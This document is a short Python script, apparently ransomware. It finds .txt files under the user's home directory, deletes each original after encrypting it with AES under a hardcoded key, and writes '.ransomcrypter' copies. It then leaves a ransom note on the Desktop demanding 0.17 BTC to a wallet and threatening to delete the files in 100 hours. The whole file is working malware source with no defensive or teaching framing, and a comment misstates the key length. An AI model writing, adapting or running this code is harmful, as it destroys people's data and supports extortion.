import os
import glob
import time
import pyaes
from pathlib import Path
filename_filter = ["*.txt"]
base_path=Path.home()
y = Path.home() / "Desktop"
os.chdir(y)
print('Criptografando')
time.sleep(3)
def revert(var):
    c=int(len(var)-1)
    msg=''
    for i in var:
        msg=msg+var[c]
        c=c-1
    return msg
def form(var):
    var=var.__str__()
    c=int(len(var)-1)
    o=r"\ ".replace(" ","")
    msg=''
    for g in var:
        if var[c]==o:
            break
        else:
            msg=msg+var[c]
        c=c-1
    msg=revert(msg)
    msg=var.replace(msg, "")
    return msg
def varer():
    pastas=[]
    for t in filename_filter:
        for filename in Path(base_path).rglob(t):
            pastas.append(form(filename))
    return pastas
def txt():
    msg=open(f'{y}\\LEIA.txt','w+')
    msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
    msg.writelines("ALL YOUR FILES HAVE BEEN ENCRYPTED. \nAND IN 100 HRS THEY WILL BE DELETED.")
    msg.writelines("SO THAT DOES NOT HAPPEN SEND 0.17BTC TO OUR WALLET: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX.")
    msg.writelines("\n\nWE ARE ANONYMOUS.\nWE ARE LEGION.\nWE DO NOT FORGIVE\nWE DO NOT FORGET.\nEXPECT US")
    msg.close()
def criptografando():
    for files in filename_filter:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()
            os.remove(f'{desktop}\\{format_file}')
            key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)
            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()
lst_past = varer()
for i in lst_past:
    try:
        desktop = Path.home() / i
    except Exception:
        pass
    os.chdir(desktop)
    criptografando()
txt()
